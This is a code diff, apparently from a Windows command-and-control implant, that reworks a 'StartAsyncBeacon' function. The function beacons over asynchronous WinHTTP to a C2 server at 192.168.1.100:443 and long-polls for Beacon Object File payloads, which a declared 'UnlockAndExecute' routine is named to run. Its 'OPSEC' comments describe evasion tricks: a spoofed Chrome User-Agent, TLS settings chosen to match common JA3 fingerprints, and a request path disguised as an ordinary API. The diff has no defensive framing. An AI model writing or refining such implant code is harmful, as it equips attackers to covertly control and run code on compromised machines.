@@ -19,37 +19,59 @@ void UnlockAndExecute(LPVOID pBofBuffer, DWORD dwBofSize); // We will define thi
 // -----------------------------------------------------------------------------
 // ASYNC BEACON PRIMITIVE
 // -----------------------------------------------------------------------------
-BOOL StartAsyncBeacon() {
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
-                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
-                                     WINHTTP_NO_PROXY_NAME, 
-                                     WINHTTP_NO_PROXY_BYPASS, 
-                                     WINHTTP_FLAG_ASYNC); // <- Delegate wait to the kernel
-    if (!hSession) return FALSE;
+BOOL StartAsyncBeacon(PHTTP_CONTEXT pCtx) {
+    if (!pCtx) return FALSE;
 
-    // Register the IOCP callback (triggered when the kernel receives network events)
-    WinHttpSetStatusCallback(hSession, 
+    // 1. Session Initialization
+    // OPSEC: Match a specific, modern User-Agent exactly.
+    pCtx->hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
+                                 WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
+                                 WINHTTP_NO_PROXY_NAME, 
+                                 WINHTTP_NO_PROXY_BYPASS, 
+                                 WINHTTP_FLAG_ASYNC); // Asynchronous I/O via Kernel IOCP
+    if (!pCtx->hSession) return FALSE;
+
+    // 2. OPSEC: TLS Pinning / Fingerprint adjustment
+    // Force TLS 1.2 and 1.3 to avoid downgrade attacks and match modern JA3 fingerprints.
+    DWORD dwTlsOptions = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
+    WinHttpSetOption(pCtx->hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &dwTlsOptions, sizeof(dwTlsOptions));
+
+    // 3. Register the IOCP callback
+    WinHttpSetStatusCallback(pCtx->hSession, 
                              (WINHTTP_STATUS_CALLBACK)IocpWakeupCallback, 
                              WINHTTP_CALLBACK_FLAG_ALL_COMPLETIONS, 
                              0);
 
-    // Connect to C2
-    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.1.100", 4321, 0);
-    if (!hConnect) return FALSE;
+    // 4. Connect to C2 (Use 443 for HTTPS)
+    pCtx->hConnect = WinHttpConnect(pCtx->hSession, L"192.168.1.100", 443, 0);
+    if (!pCtx->hConnect) goto Cleanup;
 
-    // Prepare the GET request for the BOF
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/bof", 
-                                            NULL, WINHTTP_NO_REFERER, 
-                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 
-                                            WINHTTP_FLAG_SECURE); // Use HTTPS
-    if (!hRequest) return FALSE;
+    // 5. Open Request
+    // OPSEC: WINHTTP_FLAG_SECURE is mandatory for HTTPS.
+    pCtx->hRequest = WinHttpOpenRequest(pCtx->hConnect, L"GET", L"/api/v1/poll", 
+                                        NULL, WINHTTP_NO_REFERER, 
+                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 
+                                        WINHTTP_FLAG_SECURE);
+    if (!pCtx->hRequest) goto Cleanup;
 
-    // Send the request. This returns immediately. Network I/O is handled by the Kernel.
-    // Note: We can pass a custom struct via dwContext (the 5th parameter) to maintain 
-    // our download buffer state across multiple asynchronous callback triggers.
-    BOOL bResult = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    // 6. OS-Level Long Polling Configuration
+    // Parameters: Resolve (0=default), Connect (60s), Send (30s), Receive (INFINITE)
+    // The kernel will hold the TCP socket in ESTABLISHED state indefinitely while waiting for the C2 PSH flag.
+    WinHttpSetTimeouts(pCtx->hRequest, 0, 60000, 30000, INFINITE);
+
+    // 7. Send Request
+    // CRITICAL: We pass pCtx as the 5th parameter (dwContext). 
+    // The kernel attaches this pointer to the I/O Completion Packet.
+    BOOL bResult = WinHttpSendRequest(pCtx->hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, (DWORD_PTR)pCtx);
     
-    return bResult;
+    if (bResult) return TRUE;
+
+Cleanup:
+    // Close handles on immediate failure to prevent handle leaks in the PEB.
+    if (pCtx->hRequest) WinHttpCloseHandle(pCtx->hRequest);
+    if (pCtx->hConnect) WinHttpCloseHandle(pCtx->hConnect);
+    if (pCtx->hSession) WinHttpCloseHandle(pCtx->hSession);
+    return FALSE;
 }
 
 // -----------------------------------------------------------------------------
